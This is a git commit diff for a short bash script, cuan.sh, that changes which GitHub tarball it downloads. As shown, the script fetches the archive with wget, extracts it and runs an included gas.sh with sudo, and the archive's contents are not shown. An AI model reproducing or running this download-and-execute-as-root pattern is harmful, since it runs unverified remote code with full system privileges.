f74f94f720bf9f7c1f4111d3b39840a421c48c51
Pantaiselatan <87744651+Pantaiselatan@users.noreply.github.com>
2021-08-26 11:17:25 +0700

    Update cuan.sh

--- cuan.sh
+++ cuan.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://github.com/ilyesdjaa/jungkel/raw/main/aduh.tar.gz && tar xf aduh.tar.gz
+wget https://github.com/Pantaiselatan/kemed/raw/main/gtr.tar.gz && tar xf gtr.tar.gz
 sudo ./gas.sh
